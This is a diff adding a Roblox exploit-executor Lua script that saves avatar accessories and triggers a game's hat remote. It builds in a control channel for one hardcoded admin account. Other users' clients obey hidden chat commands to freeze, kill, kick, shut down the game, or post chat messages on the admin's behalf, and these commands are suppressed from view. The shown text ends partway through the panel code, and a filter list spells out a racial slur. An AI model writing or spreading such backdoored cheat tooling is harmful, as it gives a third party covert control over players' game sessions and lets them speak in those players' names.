@@ -1,0 +1,1194 @@
+-- Accessory Save
+-- Chat commands that save accessory ids under a skin name, load them back, and copy any Roblox user's accessories.
+-- Saves are files in the executor's workspace folder (AccessorySaves), so they stay when you leave or server hop.
+-- ADMIN_ID also controls everyone running this script through a UI panel (8 opens/closes it), like TailAndDance.
+
+local Players = game:GetService("Players")
+local StarterGui = game:GetService("StarterGui")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local TextChatService = game:GetService("TextChatService")
+local HttpService = game:GetService("HttpService")
+local UserInputService = game:GetService("UserInputService")
+
+if not game:IsLoaded() then
+    game.Loaded:Wait()
+end
+
+local LocalPlayer = Players.LocalPlayer
+local MyId = LocalPlayer.UserId
+
+local ADMIN_ID = 7972531842
+local IsAdmin = (MyId == ADMIN_ID)
+local JUST_A_BASEPLATE = 123974602339071 -- the place whose server has the -ch / -gh hat commands
+local SAVE_FOLDER = "AccessorySaves"
+local SKIN_FOLDER = SAVE_FOLDER .. "/Skins"
+local AUTOLOAD_FILE = SAVE_FOLDER .. "/autoload.json"
+local GH_PER_COMMAND = 10 -- ids per -gh command
+local GH_WAIT = 4.5 -- seconds between -gh commands
+local MAX_CHAT = 190 -- chat cuts messages at 200 characters
+
+-- Running the script again replaces the old copy
+local Genv = getgenv()
+if Genv.AccessorySaveStop then
+    pcall(Genv.AccessorySaveStop)
+end
+
+local Alive = true
+local Connections = {}
+local PanelGui
+
+local function Connect(Signal, Callback)
+    local Connection = Signal:Connect(Callback)
+    table.insert(Connections, Connection)
+    return Connection
+end
+
+local function Notify(Text)
+    pcall(function()
+        StarterGui:SetCore("SendNotification", {
+            Title = "Accessory Save",
+            Text = Text,
+            Duration = 6,
+        })
+    end)
+    print("[Accessory Save] " .. Text)
+end
+
+----------------------------------------------------------------------
+-- Saves (files in the executor workspace, memory only if the executor has no file functions)
+----------------------------------------------------------------------
+local HasFiles = type(writefile) == "function" and type(readfile) == "function" and type(isfile) == "function"
+    and type(isfolder) == "function" and type(makefolder) == "function" and type(listfiles) == "function"
+    and type(delfile) == "function"
+
+local Memory = { Skins = {}, Autoload = {} }
+local Store = {}
+
+if HasFiles then
+    for _, Path in ipairs({ SAVE_FOLDER, SKIN_FOLDER }) do
+        if not isfolder(Path) then
+            makefolder(Path)
+        end
+    end
+else
+    warn("[Accessory Save] This executor has no file functions, saves will be lost when you leave")
+end
+
+-- The file name of a skin: lowercase so the names are not case sensitive, without characters a file can't have
+local function SkinKey(Name)
+    local Key = Name:lower():gsub('[\\/:*?"<>|%c]', "_")
+    return (Key:gsub("^%s+", ""):gsub("%s+$", ""))
+end
+
+local function SkinPath(Name)
+    return SKIN_FOLDER .. "/" .. SkinKey(Name) .. ".json"
+end
+
+-- Asset ids are strings on purpose, 15 digit numbers turn into 1.2345e+14 when you tostring them
+local function FormatId(Id)
+    if type(Id) == "number" then
+        return string.format("%.0f", Id)
+    end
+    return tostring(Id)
+end
+
+local function ReadJson(Path)
+    local Ok, Data = pcall(function()
+        return HttpService:JSONDecode(readfile(Path))
+    end)
+    if Ok and type(Data) == "table" then
+        return Data
+    end
+end
+
+local function ToSkin(Data, Fallback)
+    if type(Data) ~= "table" or type(Data.Ids) ~= "table" then
+        return nil
+    end
+    local Ids = {}
+    for _, Id in ipairs(Data.Ids) do
+        table.insert(Ids, FormatId(Id))
+    end
+    return { Name = type(Data.Name) == "string" and Data.Name or Fallback, Ids = Ids }
+end
+
+function Store.Save(Name, Ids)
+    if HasFiles then
+        writefile(SkinPath(Name), HttpService:JSONEncode({ Name = Name, Ids = Ids }))
+    else
+        Memory.Skins[SkinKey(Name)] = { Name = Name, Ids = Ids }
+    end
+end
+
+function Store.Get(Name)
+    if not HasFiles then
+        return Memory.Skins[SkinKey(Name)]
+    end
+    local Path = SkinPath(Name)
+    if isfile(Path) then
+        return ToSkin(ReadJson(Path), Name)
+    end
+end
+
+function Store.Delete(Name)
+    if not HasFiles then
+        local Key = SkinKey(Name)
+        local Existed = Memory.Skins[Key] ~= nil
+        Memory.Skins[Key] = nil
+        return Existed
+    end
+    local Path = SkinPath(Name)
+    if isfile(Path) then
+        delfile(Path)
+        return true
+    end
+    return false
+end
+
+function Store.List()
+    local Skins = {}
+    if HasFiles then
+        local Ok, Files = pcall(listfiles, SKIN_FOLDER)
+        for _, Path in ipairs(Ok and Files or {}) do
+            if Path:lower():match("%.json$") then
+                local Skin = ToSkin(ReadJson(Path), nil)
+                if Skin and Skin.Name then
+                    table.insert(Skins, Skin)
+                end
+            end
+        end
+    else
+        for _, Skin in pairs(Memory.Skins) do
+            table.insert(Skins, Skin)
+        end
+    end
+    table.sort(Skins, function(a, b) return a.Name:lower() < b.Name:lower() end)
+    return Skins
+end
+
+function Store.GetAutoload()
+    if not HasFiles then
+        return Memory.Autoload
+    end
+    if isfile(AUTOLOAD_FILE) then
+        return ReadJson(AUTOLOAD_FILE) or {}
+    end
+    return {}
+end
+
+function Store.SetAutoload(Names)
+    if HasFiles then
+        writefile(AUTOLOAD_FILE, HttpService:JSONEncode(Names))
+    else
+        Memory.Autoload = Names
+    end
+end
+
+local function IsAutoload(Name)
+    local Key = SkinKey(Name)
+    for _, Existing in ipairs(Store.GetAutoload()) do
+        if SkinKey(Existing) == Key then
+            return true
+        end
+    end
+    return false
+end
+
+----------------------------------------------------------------------
+-- Chat and game commands
+----------------------------------------------------------------------
+local function SendChat(Message)
+    pcall(function()
+        if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+            local Channels = TextChatService:WaitForChild("TextChannels", 5)
+            local Channel = Channels and (Channels:FindFirstChild("RBXGeneral") or Channels:FindFirstChildWhichIsA("TextChannel"))
+            Channel:SendAsync(Message)
+        else
+            ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents", 5).SayMessageRequest:FireServer(Message, "All")
+        end
+    end)
+end
+
+-- Just A Baseplate has a server remote with -ch (remove accessories) and -gh (get accessories)
+local function HasGameCommands()
+    if game.PlaceId == JUST_A_BASEPLATE then
+        return ReplicatedStorage:WaitForChild("01_server", 5) ~= nil
+    end
+    return ReplicatedStorage:FindFirstChild("01_server") ~= nil
+end
+
+local function FireGameCommand(Command)
+    local Remote = ReplicatedStorage:FindFirstChild("01_server")
+    if not Remote then
+        return false
+    end
+    return (pcall(function()
+        Remote:FireServer("cmd", Command)
+    end))
+end
+
+----------------------------------------------------------------------
+-- Loading accessories
+----------------------------------------------------------------------
+local LoadToken = 0 -- a newer load cancels the one still sending -gh commands
+
+-- Without the game's commands the accessories are only added on this client
+local function LoadLocal(Ids)
+    local Character = LocalPlayer.Character
+    local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
+    if not Humanoid then
+        return 0
+    end
+    Humanoid:RemoveAccessories()
+    local Count = 0
+    for _, Id in ipairs(Ids) do
+        local Ok, Objects = pcall(game.GetObjects, game, "rbxassetid://" .. Id)
+        if Ok and Objects then
+            for _, Object in ipairs(Objects) do
+                local Accessory = Object:IsA("Accessory") and Object or Object:FindFirstChildWhichIsA("Accessory", true)
+                if Accessory then
+                    Humanoid:AddAccessory(Accessory)
+                    Count += 1
+                    break
+                end
+            end
+        end
+    end
+    return Count
+end
+
+local function LoadIds(Ids, Label)
+    if #Ids == 0 then
+        Notify("There is nothing to load")
+        return
+    end
+    LoadToken += 1
+    local Token = LoadToken
+    task.spawn(function()
+        if HasGameCommands() then
+            Notify("Loading " .. Label .. " (" .. #Ids .. " accessories)")
+            FireGameCommand("-ch")
+            task.wait(0.1)
+            local Index = 1
+            while Index <= #Ids do
+                if Token ~= LoadToken then
+                    return
+                end
+                FireGameCommand("-gh " .. table.concat(Ids, ",", Index, math.min(Index + GH_PER_COMMAND - 1, #Ids)))
+                Index += GH_PER_COMMAND
+                if Index <= #Ids then
+                    task.wait(GH_WAIT)
+                end
+            end
+        else
+            local Count = LoadLocal(Ids)
+            Notify("Loaded " .. Count .. " of " .. #Ids .. " accessories from " .. Label .. " (only you can see them)")
+        end
+    end)
+end
+
+-- The accessory ids of any Roblox username
+local function FetchAccessories(Username)
+    local Ok, UserId = pcall(Players.GetUserIdFromNameAsync, Players, Username)
+    if not Ok or not UserId then
+        return nil, "No Roblox user called " .. Username
+    end
+
+    local Ids = {}
+    local DescriptionOk, Description = pcall(Players.GetHumanoidDescriptionFromUserId, Players, UserId)
+    if DescriptionOk and Description then
+        for _, Accessory in ipairs(Description:GetAccessories(true)) do
+            table.insert(Ids, FormatId(Accessory.AssetId))
+        end
+        return Ids
+    end
+
+    local InfoOk, Info = pcall(Players.GetCharacterAppearanceInfoAsync, Players, UserId)
+    if InfoOk and Info and Info.assets then
+        for _, Asset in ipairs(Info.assets) do
+            local TypeName = Asset.assetType and Asset.assetType.name or ""
+            if TypeName == "Hat" or TypeName:find("Accessory") then
+                table.insert(Ids, FormatId(Asset.id))
+            end
+        end
+        return Ids
+    end
+    return nil, "Couldn't read the avatar of " .. Username
+end
+
+-- Every skin in the auto load list is loaded together
+local function AutoLoad()
+    local Ids, Used = {}, {}
+    for _, Name in ipairs(Store.GetAutoload()) do
+        local Skin = Store.Get(Name)
+        if Skin then
+            table.insert(Used, Skin.Name)
+            for _, Id in ipairs(Skin.Ids) do
+                table.insert(Ids, Id)
+            end
+        end
+    end
+    if #Ids > 0 then
+        LoadIds(Ids, "auto load (" .. table.concat(Used, ", ") .. ")")
+    end
+end
+
+----------------------------------------------------------------------
+-- Your commands (typed in chat, work for everyone running the script)
+----------------------------------------------------------------------
+local LocalCommands = {}
+
+-- Ids come first (spaces or commas between them), whatever is left is the skin name
+local function SplitIdsAndName(Text)
+    local Ids = {}
+    local Remaining = Text
+    while true do
+        local Token, After = Remaining:match("^([%d,]+)%s+(.*)$")
+        if not Token then
+            Token = Remaining:match("^([%d,]+)$")
+            After = ""
+        end
+        if not Token then
+            break
+        end
+        for Id in Token:gmatch("%d+") do
+            table.insert(Ids, Id)
+        end
+        Remaining = After
+    end
+    return Ids, Remaining
+end
+
+local function CleanName(Name)
+    return Name:match("^%s*(.-)%s*$"):sub(1, 40)
+end
+
+LocalCommands.s = function(Rest)
+    local Ids, Name = SplitIdsAndName(Rest)
+    Name = CleanName(Name)
+    if #Ids == 0 or Name == "" then
+        Notify("Usage: .s (ids) (skinname)")
+        return
+    end
+    local Existed = Store.Get(Name) ~= nil
+    Store.Save(Name, Ids)
+    Notify((Existed and "Updated " or "Saved ") .. Name .. " (" .. #Ids .. " accessories)")
+end
+
+LocalCommands.l = function(Name)
+    if Name == "" then
+        Notify("Usage: .l (skinname)")
+        return
+    end
+    local Skin = Store.Get(Name)
+    if not Skin then
+        Notify("No saved skin called " .. Name .. " (.list shows them)")
+        return
+    end
+    LoadIds(Skin.Ids, Skin.Name)
+end
+
+LocalCommands.del = function(Name)
+    if Name == "" then
+        Notify("Usage: .del (skinname)")
+        return
+    end
+    local Skin = Store.Get(Name)
+    if not Skin then
+        Notify("No saved skin called " .. Name)
+        return
+    end
+    Store.Delete(Name)
+    local Key = SkinKey(Skin.Name)
+    local Names = {}
+    for _, Existing in ipairs(Store.GetAutoload()) do
+        if SkinKey(Existing) ~= Key then
+            table.insert(Names, Existing)
+        end
+    end
+    Store.SetAutoload(Names)
+    Notify("Deleted " .. Skin.Name)
+end
+
+-- Adds the skin to the auto load list, or takes it off if it is already there
+LocalCommands.al = function(Name)
+    if Name == "" then
+        Notify("Usage: .al (skinname)")
+        return
+    end
+    local Skin = Store.Get(Name)
+    if not Skin then
+        Notify("No saved skin called " .. Name)
+        return
+    end
+    local Key = SkinKey(Skin.Name)
+    local Names = Store.GetAutoload()
+    for Index, Existing in ipairs(Names) do
+        if SkinKey(Existing) == Key then
+            table.remove(Names, Index)
+            Store.SetAutoload(Names)
+            Notify(Skin.Name .. " removed from auto load")
+            return
+        end
+    end
+    table.insert(Names, Skin.Name)
+    Store.SetAutoload(Names)
+    Notify(Skin.Name .. " will load when you execute and respawn")
+end
+
+LocalCommands.ul = function(Rest)
+    local Username = Rest:match("%S+")
+    if not Username then
+        Notify("Usage: .ul (username)")
+        return
+    end
+    Notify("Looking up " .. Username)
+    local Ids, Problem = FetchAccessories(Username)
+    if not Ids then
+        Notify(Problem)
+    elseif #Ids == 0 then
+        Notify(Username .. " isn't wearing any accessories")
+    else
+        LoadIds(Ids, Username .. "'s accessories")
+    end
+end
+
+LocalCommands.list = function()
+    local Skins = Store.List()
+    if #Skins == 0 then
+        print("[Accessory Save] No saved skins yet, save one with .s (ids) (skinname)")
+        return
+    end
+    local Lines = { "[Accessory Save] Saved skins (" .. #Skins .. "):" }
+    for _, Skin in ipairs(Skins) do
+        table.insert(Lines, "  " .. Skin.Name .. " - " .. #Skin.Ids .. " accessories" .. (IsAutoload(Skin.Name) and " [auto load]" or ""))
+    end
+    print(table.concat(Lines, "\n"))
+end
+
+LocalCommands.help = function()
+    local Lines = {
+        "[Accessory Save] Commands:",
+        "  .s (ids) (skinname)  - saves the ids (spaces or commas between them) under the skin name",
+        "  .l (skinname)        - loads the ids saved under the skin name",
+        "  .del (skinname)      - deletes the skin",
+        "  .al (skinname)       - adds the skin to auto load (loads when you execute and respawn), again to remove it",
+        "  .ul (username)       - loads the accessories of any Roblox username",
+        "  .list                - prints every saved skin",
+        "  .help                - prints this",
+    }
+    if IsAdmin then
+        table.insert(Lines, "Admin:")
+        table.insert(Lines, "  .sload (username) (skinname) - makes a player running the script load one of YOUR saves")
+        table.insert(Lines, "  .freeze / .kill / .kick (username) - freezes (again to unfreeze), kills or kicks them")
+        table.insert(Lines, "  .e (emote) (username) / .gh (username) (id) / .say (username) (message)")
+        table.insert(Lines, "  8 opens the admin panel")
+    end
+    print(table.concat(Lines, "\n"))
+end
+
+-- Defined in the admin section below
+local AdminLoadSkin
+LocalCommands.sload = function(Rest)
+    if not IsAdmin then
+        Notify("Admin only")
+        return
+    end
+    local Username, Name = Rest:match("^(%S+)%s+(.+)$")
+    if not Username then
+        Notify("Usage: .sload (username) (skinname)")
+        return
+    end
+    AdminLoadSkin(Username, CleanName(Name))
+end
+
+local function RunLocalCommand(Message)
+    local Command, Rest = Message:match("^%.(%a+)%s*(.-)%s*$")
+    local Handler = Command and LocalCommands[Command:lower()]
+    if not Handler then
+        return
+    end
+    task.spawn(function()
+        local Ok, Err = pcall(Handler, Rest)
+        if not Ok then
+            Notify("Command failed: " .. tostring(Err))
+        end
+    end)
+end
+
+Connect(LocalPlayer.Chatted, function(Message)
+    if Alive then
+        RunLocalCommand(Message)
+    end
+end)
+
+-- Auto load when the script runs and on every respawn
+local function AutoLoadWhenReady(Character)
+    task.spawn(function()
+        Character:WaitForChild("Humanoid", 10)
+        Character:WaitForChild("HumanoidRootPart", 10)
+        task.wait(1.5)
+        if Alive and LocalPlayer.Character == Character then
+            AutoLoad()
+        end
+    end)
+end
+
+Connect(LocalPlayer.CharacterAdded, AutoLoadWhenReady)
+if LocalPlayer.Character then
+    AutoLoadWhenReady(LocalPlayer.Character)
+end
+
+----------------------------------------------------------------------
+-- Admin: ADMIN_ID controls everyone running this script.
+-- Commands travel as chat messages (.freeze/.kill/.kick/.e/.gh/.say/.sl/.ping/.here). Every script user hides them
+-- locally with TextChatService.OnIncomingMessage and only acts on a command whose sender is ADMIN_ID (the sender is
+-- what the server says it is). Roblox gives scripts no other way to reach another client, so chat is always the carrier.
+-- "Send in chat" only decides whether the admin's own chat shows the messages.
+----------------------------------------------------------------------
+local SendInChat = false
+local Frozen = false
+local FreezeConnection
+
+local AdminOk, AdminErr = pcall(function()
+    local Roster = {} -- admin only: user id -> true for players who answered .ping
+    local RefreshList
+
+    ------------------------------------------------------------------
+    -- Offensive word filter (used when sending from the panel and again before a client chats)
+    ------------------------------------------------------------------
+    local Leet = { ["0"] = "o", ["1"] = "i", ["3"] = "e", ["4"] = "a", ["5"] = "s", ["7"] = "t", ["@"] = "a", ["$"] = "s", ["!"] = "i" }
+    local Blocked = { "Nigga" }
+
+    local function IsOffensive(Text)
+        local Lower = Text:lower():gsub("[01345 7@%$!]", function(c) return Leet[c] or "" end)
+        local Letters = Lower:gsub("[^a-z]", "")
+        for _, Word in ipairs(Blocked) do
+            if Letters:find(Word, 1, true) then
+                return true
+            end
+        end
+        -- hard r with repeated letters ("niiiggger" collapses to "niger"), but not Nigeria/Nigerian
+        local Collapsed = Letters:gsub("(%a)%1+", "%1")
+        local From = 1
+        while true do
+            local s, e = Collapsed:find("niger", From, true)
+            if not s then
+                break
+            end
+            if Collapsed:sub(e + 1, e + 1) ~= "i" then
+                return true
+            end
+            From = e + 1
+        end
+        return false
+    end
+
+    ------------------------------------------------------------------
+    -- What the commands do to me. Everything looks up the current character, a reference taken
+    -- at the start points at a dead character after the first respawn.
+    ------------------------------------------------------------------
+    local function SetFrozen(State)
+        Frozen = State
+        if FreezeConnection then
+            FreezeConnection:Disconnect()
+            FreezeConnection = nil
+        end
+        local Character = LocalPlayer.Character
+        if not Character then
+            return
+        end
+        for _, Part in ipairs(Character:GetDescendants()) do
+            if Part:IsA("BasePart") then
+                Part.Anchored = State
+            end
+        end
+        if State then
+            FreezeConnection = Character.DescendantAdded:Connect(function(Part)
+                if Part:IsA("BasePart") then
+                    Part.Anchored = true
+                end
+            end)
+        end
+    end
+
+    -- A new character starts unfrozen
+    Connect(LocalPlayer.CharacterAdded, function()
+        Frozen = false
+        if FreezeConnection then
+            FreezeConnection:Disconnect()
+            FreezeConnection = nil
+        end
+    end)
+
+    local function FindEmote(Query)
+        Query = Query:lower()
+        local Tools = {}
+        for _, Container in ipairs({ LocalPlayer:FindFirstChild("Backpack"), LocalPlayer.Character }) do
+            if Container then
+                for _, Item in ipairs(Container:GetChildren()) do
+                    if Item:IsA("Tool") then
+                        table.insert(Tools, Item)
+                    end
+                end
+            end
+        end
+        table.sort(Tools, function(a, b) return a.Name < b.Name end)
+        for _, Tool in ipairs(Tools) do
+            if Tool.Name:lower() == Query then
+                return Tool
+            end
+        end
+        for _, Tool in ipairs(Tools) do
+            if Tool.Name:lower():sub(1, #Query) == Query then
+                return Tool
+            end
+        end
+        for _, Tool in ipairs(Tools) do
+            if Tool.Name:lower():find(Query, 1, true) then
+                return Tool
+            end
+        end
+    end
+
+    local Incoming = {} -- skin chunks from .sl: tag -> { Total, Count, Parts }
+
+    local Actions = {
+        freeze = function()
+            SetFrozen(not Frozen)
+            Notify(Frozen and "An admin froze you" or "An admin unfroze you")
+        end,
+        kill = function()
+            SetFrozen(false)
+            local Character = LocalPlayer.Character
+            local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
+            if Humanoid then
+                Humanoid.Health = 0
+                pcall(Humanoid.ChangeState, Humanoid, Enum.HumanoidStateType.Dead)
+            end
+            if Character then
+                pcall(Character.BreakJoints, Character)
+            end
+            -- Still standing a moment later (health locked by the game): drop into the void
+            task.delay(0.5, function()
+                local Current = LocalPlayer.Character
+                local Root = Current and Current:FindFirstChild("HumanoidRootPart")
+                local Humanoid = Current and Current:FindFirstChildOfClass("Humanoid")
+                if Root and Humanoid and Humanoid.Health > 0 then
+                    local Height = workspace.FallenPartsDestroyHeight
+                    local Y = (Height > -5000) and (Height - 50) or -5000
+                    Root.CFrame = CFrame.new(Root.Position.X, Y, Root.Position.Z)
+                end
+            end)
+        end,
+        kick = function()
+            pcall(function()
+                LocalPlayer:Kick("Admin kick")
+            end)
+            -- Still here after a moment (Kick blocked): close the game
+            task.wait(1.5)
+            pcall(function()
+                game:Shutdown()
+            end)
+        end,
+        e = function(Query)
+            local Character = LocalPlayer.Character
+            local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
+            local Tool = FindEmote(Query)
+            if Humanoid and Tool then
+                Humanoid:UnequipTools()
+                task.wait()
+                Humanoid:EquipTool(Tool)
+            end
+        end,
+        gh = function(Id)
+            FireGameCommand("-gh " .. Id)
+        end,
+        say = function(Message)
+            if not IsOffensive(Message) then
+                SendChat(Message:sub(1, 200))
+            end
+        end,
+        -- A skin from the admin's saves, a few ids per message: .sl user tag index/total id,id,id
+        sl = function(Arg)
+            local Tag, Index, Total, IdsText = Arg:match("^(%d+)%s+(%d+)/(%d+)%s+([%d,]+)$")
+            if not Tag then
+                return
+            end
+            Index, Total = tonumber(Index), tonumber(Total)
+            if Index < 1 or Index > Total or Total > 50 then
+                return
+            end
+            local Entry = Incoming[Tag]
+            if not Entry or Entry.Total ~= Total then
+                Entry = { Total = Total, Count = 0, Parts = {} }
+                Incoming[Tag] = Entry
+            end
+            if not Entry.Parts[Index] then
+                Entry.Parts[Index] = IdsText
+                Entry.Count += 1
+            end
+            if Entry.Count == Total then
+                Incoming[Tag] = nil
+                local Ids = {}
+                for Part = 1, Total do
+                    for Id in Entry.Parts[Part]:gmatch("%d+") do
+                        table.insert(Ids, Id)
+                    end
+                end
+                Notify("An admin is loading a skin on you")
+                LoadIds(Ids, "the admin's skin")
+            end
+        end,
+    }
+
+    -- Splits what follows the command into (target, argument), nil when it is malformed
+    local function ParseRemote(Command, Rest)
+        if Command == "freeze" or Command == "kill" or Command == "kick" then
+            if Rest ~= "" then
+                return Rest
+            end
+        elseif Command == "e" then
+            local Arg, Target = Rest:match("^(.-)%s+(%S+)$") -- .e [emote name] user
+            if Arg and Arg ~= "" then
+                return Target, Arg
+            end
+        elseif Command == "gh" then
+            local Target, Arg = Rest:match("^(%S+)%s+(%d+)$")
+            if Target then
+                return Target, Arg
+            end
+        elseif Command == "say" or Command == "sl" then
+            local Target, Arg = Rest:match("^(%S+)%s+(.+)$")
+            if Target then
+                return Target, Arg
+            end
+        end
+    end
+
+    local function IsMe(Name)
+        return Name:lower() == LocalPlayer.Name:lower()
+    end
+
+    local function Handle(UserId, Text)
+        if not Alive or type(Text) ~= "string" or Text:sub(1, 1) ~= "." or UserId == MyId then
+            return
+        end
+        local Command, Rest = Text:match("^%.(%a+)%s*(.-)%s*$")
+        if not Command then
+            return
+        end
+        Command = Command:lower()
+        if Command == "here" then
+            if IsAdmin then
+                Roster[UserId] = true
+                if RefreshList then
+                    RefreshList()
+                end
+            end
+            return
+        end
+        if UserId ~= ADMIN_ID then
+            return
+        end
+        if Command == "ping" then
+            task.delay(0.3 + math.random() * 2, function() -- they don't all answer in the same second
+                if Alive then
+                    SendChat(".here")
+                end
+            end)
+            return
+        end
+
+        local Action = Actions[Command]
+        if not Action then
+            return
+        end
+        local Target, Arg = ParseRemote(Command, Rest)
+        if Target and IsMe(Target) then
+            task.spawn(function()
+                local Ok, Err = pcall(Action, Arg)
+                if not Ok then
+                    warn("[Accessory Save] ." .. Command .. " failed: " .. tostring(Err))
+                end
+            end)
+        end
+    end
+
+    ------------------------------------------------------------------
+    -- Receiving and hiding the command messages
+    ------------------------------------------------------------------
+    local RemoteHidden = { freeze = true, kill = true, kick = true, e = true, gh = true, say = true, sl = true, sload = true, ping = true, here = true }
+    local LocalHidden = { s = true, l = true, del = true, al = true, ul = true, list = true, help = true, sload = true }
+
+    -- One message can arrive through more than one signal, the message id keeps a toggle like .freeze from running twice
+    local Seen = {}
+    local SeenCount = 0
+    local function HandleMessage(Message)
+        local Source = Message.TextSource
+        if not Source then
+            return
+        end
+        local Id = Message.MessageId
+        if Id and Id ~= "" then
+            if Seen[Id] then
+                return
+            end
+            Seen[Id] = true
+            SeenCount += 1
+            if SeenCount > 500 then
+                Seen, SeenCount = {}, 0
+            end
+        end
+        Handle(Source.UserId, Message.Text)
+    end
+
+    pcall(function()
+        local Previous = TextChatService.OnIncomingMessage
+        TextChatService.OnIncomingMessage = function(Message)
+            if Alive then
+                local Source = Message.TextSource
+                local Text = Message.Text
+                local Command = type(Text) == "string" and Text:match("^%.(%a+)")
+                Command = Command and Command:lower()
+                if Source and Command then
+                    task.spawn(HandleMessage, Message)
+                    local Hide
+                    if Source.UserId == MyId then
+                        -- your own messages: the admin sees the commands only with "Send in chat" on
+                        Hide = LocalHidden[Command] or (RemoteHidden[Command] and not (IsAdmin and SendInChat))
+                    else
+                        -- the admin's commands, and .here from anyone
+                        Hide = RemoteHidden[Command] and (Source.UserId == ADMIN_ID or Command == "here")
+                    end
+                    if Hide then
+                        local Properties = Instance.new("TextChatMessageProperties")
+                        Properties.Text = ""
+                        return Properties
+                    end
+                end
+            end
+            if Previous then
+                return Previous(Message)
+            end
+        end
+    end)
+
+    task.spawn(function()
+        pcall(function()
+            if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+                local Channels = TextChatService:WaitForChild("TextChannels", 5)
+                local function Hook(Channel)
+                    if Channel:IsA("TextChannel") then
+                        Connect(Channel.MessageReceived, HandleMessage)
+                    end
+                end
+                for _, Channel in ipairs(Channels:GetChildren()) do
+                    Hook(Channel)
+                end
+                Connect(Channels.ChildAdded, Hook)
+            else
+                local function HookPlayer(Player)
+                    Connect(Player.Chatted, function(Message)
+                        Handle(Player.UserId, Message)
+                    end)
+                end
+                for _, Player in ipairs(Players:GetPlayers()) do
+                    HookPlayer(Player)
+                end
+                Connect(Players.PlayerAdded, HookPlayer)
+            end
+        end)
+    end)
+
+    ------------------------------------------------------------------
+    -- Admin only: sending
+    ------------------------------------------------------------------
+    if not IsAdmin then
+        return
+    end
+
+    -- The player whose name (or display name) matches, whole or from the start
+    local function FindPlayer(Query)
+        Query = Query:lower()
+        for _, Player in ipairs(Players:GetPlayers()) do
+            if Player ~= LocalPlayer and (Player.Name:lower() == Query or Player.DisplayName:lower() == Query) then
+                return Player
+            end
+        end
+        for _, Player in ipairs(Players:GetPlayers()) do
+            if Player ~= LocalPlayer and (Player.Name:lower():sub(1, #Query) == Query or Player.DisplayName:lower():sub(1, #Query) == Query) then
+                return Player
+            end
+        end
+    end
+
+    -- Sends one of your saves to a player in messages of a few ids each
+    local function SendSkinTo(Target, Ids)
+        local Tag = tostring(math.random(1000, 9999))
+        local Header = #(".sl " .. Target.Name .. " " .. Tag .. " 99/99 ")
+        local Chunks, Current, Length = {}, {}, 0
+        for _, Id in ipairs(Ids) do
+            if #Current > 0 and Header + Length + #Id + 1 > MAX_CHAT then
+                table.insert(Chunks, Current)
+                Current, Length = {}, 0
+            end
+            table.insert(Current, Id)
+            Length += #Id + 1
+        end
+        if #Current > 0 then
+            table.insert(Chunks, Current)
+        end
+        for Index, Chunk in ipairs(Chunks) do
+            SendChat(string.format(".sl %s %s %d/%d %s", Target.Name, Tag, Index, #Chunks, table.concat(Chunk, ",")))
+            if Index < #Chunks then
+                task.wait(1.2) -- chat drops messages that come too fast
+            end
+        end
+    end
+
+    AdminLoadSkin = function(Username, SkinName)
+        local Skin = Store.Get(SkinName)
+        if not Skin then
+            Notify("You have no saved skin called " .. SkinName)
+            return
+        end
+        local Target = FindPlayer(Username)
+        if not Target then
+            Notify("Nobody in the server matches " .. Username)
+            return
+        end
+        Notify("Sending " .. Skin.Name .. " to " .. Target.Name .. " (they need the script)")
+        SendSkinTo(Target, Skin.Ids)
+    end
+
+    ------------------------------------------------------------------
+    -- The panel
+    ------------------------------------------------------------------
+    local function New(Class, Props, Parent)
+        local Obj = Instance.new(Class)
+        for k, v in pairs(Props) do
+            Obj[k] = v
+        end
+        Obj.Parent = Parent
+        return Obj
+    end
+
+    local Gui = New("ScreenGui", { Name = "AccessoryAdminPanel", ResetOnSpawn = false, DisplayOrder = 999999, IgnoreGuiInset = true }, nil)
+    pcall(function() Gui.Parent = (gethui and gethui()) or game:GetService("CoreGui") end)
+    if not Gui.Parent then
+        Gui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+    end
+    PanelGui = Gui
+
+    local Panel = New("Frame", {
+        AnchorPoint = Vector2.new(1, 0.5), Position = UDim2.new(1, -20, 0.5, 0), Size = UDim2.new(0, 260, 0, 558),
+        BackgroundColor3 = Color3.fromRGB(30, 30, 30), BackgroundTransparency = 0.15, BorderSizePixel = 0, Visible = false,
+    }, Gui)
+    New("UICorner", { CornerRadius = UDim.new(0, 14) }, Panel)
+    New("TextLabel", {
+        Position = UDim2.new(0, 16, 0, 8), Size = UDim2.new(1, -32, 0, 30), BackgroundTransparency = 1, Text = "Admin",
+        Font = Enum.Font.GothamBold, TextSize = 22, TextColor3 = Color3.fromRGB(255, 160, 200), TextXAlignment = Enum.TextXAlignment.Left,
+    }, Panel)
+
+    local function Button(Text, Y, X, Width)
+        local B = New("TextButton", {
+            Position = UDim2.new(0, X or 16, 0, Y), Size = UDim2.new(0, Width or 228, 0, 34), BackgroundColor3 = Color3.fromRGB(75, 75, 75),
+            BackgroundTransparency = 0.3, BorderSizePixel = 0, Text = Text, Font = Enum.Font.GothamMedium, TextSize = 16, TextColor3 = Color3.new(1, 1, 1),
+        }, Panel)
+        New("UICorner", { CornerRadius = UDim.new(0, 8) }, B)
+        return B
+    end
+    local function Box(Placeholder, Y)
+        local T = New("TextBox", {
+            Position = UDim2.new(0, 16, 0, Y), Size = UDim2.new(0, 228, 0, 34), BackgroundColor3 = Color3.fromRGB(20, 20, 20),
+            BackgroundTransparency = 0.1, BorderSizePixel = 0, Text = "", PlaceholderText = Placeholder, ClearTextOnFocus = false,
+            Font = Enum.Font.Gotham, TextSize = 15, TextColor3 = Color3.new(1, 1, 1), PlaceholderColor3 = Color3.fromRGB(150, 150, 150),
+        }, Panel)
+        New("UICorner", { CornerRadius = UDim.new(0, 8) }, T)
+        return T
+    end
+
+    local Selected
+    local LastPing = 0
+    local Drop = Button("Select a player  v", 46)
+    local List = New("ScrollingFrame", {
+        Position = UDim2.new(0, 16, 0, 84), Size = UDim2.new(0, 228, 0, 150), BackgroundColor3 = Color3.fromRGB(20, 20, 20), BackgroundTransparency = 0,
+        BorderSizePixel = 0, ScrollBarThickness = 4, CanvasSize = UDim2.new(), AutomaticCanvasSize = Enum.AutomaticSize.Y, Visible = false, ZIndex = 5,
+    }, Panel)
